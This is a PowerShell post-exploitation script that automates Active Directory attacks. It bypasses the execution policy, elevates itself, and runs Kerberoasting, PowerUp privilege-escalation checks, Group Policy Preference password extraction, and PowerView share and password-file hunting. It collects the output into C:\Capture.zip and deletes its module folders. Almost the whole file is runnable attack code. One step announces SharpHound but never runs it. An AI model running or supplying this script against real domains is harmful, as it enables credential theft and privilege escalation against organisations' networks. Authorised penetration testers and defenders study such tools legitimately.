Write-Host "###########################################################################################################" -ForegroundColor Green
Write-Host "##   Local Active Directory Assessment and Privilege Escalation Script v1.0                              ##" -ForegroundColor Green
Write-Host "##   Developed By Hausec                                                                                 ##" -ForegroundColor Green
Write-Host "##                                                                                                       ##" -ForegroundColor Green
Write-Host "##   This is the LOCAL script, meaning the modules already need to be in the same directory as this      ##" -ForegroundColor Green
Write-Host "##   script                                                                                              ##" -ForegroundColor Green
Write-Host "##   Credit for .ps1s goes to Tim Medin, and the people working on Empire, BloodHound, and PowerSploit   ##" -ForegroundColor Green
Write-Host "##                                                                                                       ##" -ForegroundColor Green
Write-Host "##   If you see errors, that's normal. Unless your computer bluescreens or something. That's not normal. ##" -ForegroundColor Green
Write-Host "###########################################################################################################" -ForegroundColor Green
Set-ExecutionPolicy Unrestricted
#run as Admin check
If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
{   
$arguments = "& '" + $myinvocation.mycommand.definition + "'"
Start-Process powershell -Verb runAs -ArgumentList $arguments
Break
}
#Create capture file
$path = "C:\Capture"
"Creating the capture folder..."
If(!(test-path $path))
{
      New-Item -ItemType Directory -Force -Path $path | Out-Null
	  Write-Host "Created $path!" -ForegroundColor Green
}
else
{
	Write-Host 	"Failed to create the capture folder, it already exists" -ForegroundColor Red
}
#Get location of local modules
$modules=split-path $SCRIPT:MyInvocation.MyCommand.Path -parent
#specify modules folder
$modulepath=$env:psmodulepath.split(';')[0].split(' ')
Write-Host "Using Module path: $modulepath" -ForegroundColor Green

#create kerberoast PS module folder
If(!(test-path $modulepath/Kerberoast))
{
      New-Item -ItemType Directory -Force -Path $modulepath/Kerberoast | Out-Null
}

#download Kerberoast
Write-Host "Fetching Kerberoast module..."
Copy-Item "$modules/Invoke-Kerberoast.ps1" -Destination "$modulepath/Kerberoast/Kerberoast.psm1"
#Run Kerberoast
Write-Host "Importing module..." 
Import-Module Kerberoast.psm1
Write-Host "Running Kerberoast" -ForegroundColor  Yellow
Invoke-Kerberoast | Out-File $path\Kerberoast.krb 

#BloodHound EXE method
If(!(test-path $modulepath/Sharp))
{
      New-Item -ItemType Directory -Force -Path $modulepath/Sharp | Out-Null
}
Write-Host "Fetching Sharphound.exe..."
Copy-Item "$modules/Sharphound.exe" -Destination "$modulepath/Sharp"
Write-Host "Running SharpHound" -ForegroundColor  Yellow
#PrivEsc
If(!(test-path $modulepath/PrivEsc))
{
      New-Item -ItemType Directory -Force -Path $modulepath/PrivEsc | Out-Null
}
Write-Host "Fetching PowerUp module..."
Copy-Item "$modules/PowerUp.ps1" -Destination "$modulepath/PrivEsc/PrivEsc.psm1"
Write-Host "Importing module..."
Import-Module PrivEsc.psm1
Write-Host "Checking for Privilege Escalation paths...." -ForegroundColor Yellow
Invoke-AllChecks | Out-File $path\PrivEsc.txt

#create GPP PS module folder
If(!(test-path $modulepath/GPP))
{
      New-Item -ItemType Directory -Force -Path $modulepath/GPP | Out-Null
}
#check for GPP passwords
Write-Host "Fetching GPPP module..." 
Copy-Item "$modules/Get-GPPPassword.ps1" -Destination "$modulepath/GPP/GPP.psm1"
#import module
Write-Host "Importing module..." 
Import-Module gpp.psm1
#Run GPP. Verbose enabled so you know it's actually working or not
Write-Host "Checking for GPP Passwords, this usually takes a few minutes." -ForegroundColor Yellow
Get-GPPPassword -Verbose | Out-File $path\gpp.txt 

#PowerView
If(!(test-path $modulepath/PowerView))
{
      New-Item -ItemType Directory -Force -Path $modulepath/PowerView | Out-Null
}
Write-Host "Fetching PowerView module..." 
Copy-Item "$modules/PowerView.ps1" -Destination "$modulepath/PowerView/PowerView.psm1"
Write-Host "Importing module..."
Import-Module PowerView.psm1
Write-Host "Searching for SMB Shares..." -ForegroundColor Yellow
Invoke-ShareFinder -CheckShareAccess -Threads 20 | Out-File $path\ShareFinder.txt
Write-Host "Looking for sensitive files (Grab a coffee, this might take awhile)" -ForegroundColor Yellow
#Edit the terms if you want to look for different strings in files. Comment out this cmdlet if it takes too long.
Invoke-FileFinder -Verbose -Terms password -OutFile $path\FileFinder.txt
Write-Host "Checking for exploitable systems..." -ForegroundColor Yellow
Get-ExploitableSystem -Verbose | Export-Csv $path\ExploitableSystem.txt

#Zip it all up and remove leftovers
Compress-Archive -Path $path -Update -DestinationPath C:\Capture.zip
Remove-Item -Recurse -Force "$modulepath/Kerberoast"
Remove-Item -Recurse -Force "$modulepath/PrivEsc"
Remove-Item -Recurse -Force "$modulepath/Sharp"
Remove-Item -Recurse -Force "$modulepath/PowerView"
Remove-Item -Recurse -Force $path
Write-Host "Done! Results stored in the Capture.zip file!" -ForegroundColor Green